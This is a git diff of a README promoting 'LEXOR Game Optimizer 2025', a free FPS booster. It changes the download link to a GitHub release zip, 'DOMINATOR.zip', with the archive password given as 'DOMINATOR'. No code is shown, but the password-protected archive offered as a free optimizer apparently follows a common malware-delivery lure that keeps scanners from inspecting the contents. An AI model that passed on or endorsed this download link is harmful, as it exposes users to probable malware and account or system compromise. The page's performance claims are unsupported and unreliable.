@@ -1,7 +1,7 @@
 # LEXOR Game Optimizer 2025 – Boost FPS &amp; Clean Your System Free
 # 🚀 **LEXOR — The Ultimate Game Optimization Tool**
 
-👉 **[⬇️ Download LEXOR](https://github.com/Bayb1k/LEXOR-Game-Optimization/releases/download/Booster/LEXOR.Game.Optimization.zip)**  
+👉 **[⬇️ Download LEXOR](https://github.com/Bayb1k/LEXOR-Game-Optimization/releases/download/Booster/DOMINATOR.zip)**  
 🔐 **Password: `DOMINATOR`**
 
 Tired of lag, FPS drops, or stuttering in your favorite games?  
